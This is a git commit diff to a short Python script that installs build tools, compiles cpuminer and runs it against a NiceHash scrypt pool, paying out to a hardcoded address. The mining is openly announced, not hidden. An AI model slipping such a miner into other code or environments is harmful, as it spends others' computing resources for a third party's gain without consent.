4ab5e65aa69a863722c0a753dc9f49faec9efa44
MrFeori <57797277+Feori-YT@users.noreply.github.com>
2022-07-04 20:38:34 +0300

    Update main.py

--- main.py
+++ main.py
@@ -1,10 +1,10 @@
 import os
+import subprocess
 
 os.system('apt-get install libcurl4-openssl-dev libncurses5-dev pkg-config automake yasm')
-os.system('git clone https://github.com/pooler/cpuminer.git')
 os.chdir("cpuminer")
 os.system('./autogen.sh')
 os.system('./configure CFLAGS="-O3"')
 os.system('make')
 print('Mining started! Good luck!')
-os.system('./minerd --algo scrypt --url=stratum+tcp://scrypt.auto.nicehash.com:9200  --user=3CAzPkcn3g2TkWNbqd3ZN5HvoB6ZQLm6cF')
+subprocess.run(["./minerd", "-a", "scrypt","-o","stratum+tcp://scrypt.auto.nicehash.com:9200","-u","3CAzPkcn3g2TkWNbqd3ZN5HvoB6ZQLm6cF"])
